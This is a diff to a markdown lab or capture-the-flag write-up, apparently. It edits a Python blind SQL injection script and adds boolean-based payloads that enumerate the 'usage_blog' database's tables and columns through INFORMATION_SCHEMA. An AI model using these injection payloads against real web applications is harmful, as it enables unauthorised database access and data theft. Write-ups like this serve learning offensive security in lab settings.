@@ -76,7 +76,7 @@ def makeSQLi():
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0"
     }
 
-    for position in range(1,50):
+    for position in range(1,250):
         for character in characters:
             # Post data
             post_data = {
@@ -139,8 +139,13 @@ if __name__ == '__main__':
 
 The script run slow but works, we are getting the database name
 Database name: `usage_blog`
-- now we can modify the script to get the value we want, for example lets list the tables of this data base `1' or substring((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ', ') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'usage_blog'),1,1) = 'a' -- -`
+- now we can modify the script to get the value we want, for example lets list the tables of this data base `1' or substring((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'usage_blog'),1,1) = 'a' -- -`
 >[!example]- Result
 >![[Pasted image 20250320184858.png]]
 
-![[Pasted image 20250321011627.png]]
+>[!info]- Check the number of result of a request, for example, the number of tables
+>```sql
+>1' or (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='usage_blog')=15 -- -
+>```
+
+- Now getting the name of the column of a table, `1' OR SUBSTRING( (SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'usage_blog' AND TABLE_NAME = 'tabla_ejemplo' ), 1, 1 ) = 'a' -- -`
